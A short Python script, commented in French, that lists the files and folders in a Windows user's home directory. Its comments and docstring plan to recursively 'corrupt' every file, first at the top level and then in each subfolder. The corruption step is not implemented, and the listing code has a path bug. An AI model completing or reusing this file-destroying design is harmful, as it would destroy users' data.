import os
import sys
if __name__ == '__main__':
    # Objectif : Ouvrir tous les dossiers et sous dossier
    if sys.platform == "win32":

        directory_user = "\\".join(__file__.split("\\")[:3])

        print(directory_user)

        for file in os.listdir(directory_user):

            if os.path.isdir(f"{directory_user}\\{file}"):
                print("directory-->",  os.listdir((file)))

            if os.path.isfile(f"{directory_user}\\{file}"):
                # corrompre
                print("Fichier -->", file)

    # print(os.listdir(directory_user))

"""
Faire un tableau , trier sur base si c'est un fichier ou dossier .
mettre les fichiers en premier --> les corrompre d'abord
ensuite passer au dossier à chaque dossier --> les
pour chaque dossier et sous dossier ainsi de suite  , repeter le meme principe avec les fichiers
while dossier a l'interieur de dossier :
    ouvrir dossier ,
    ajouter tous les fichiers dans un tableau
    
    """
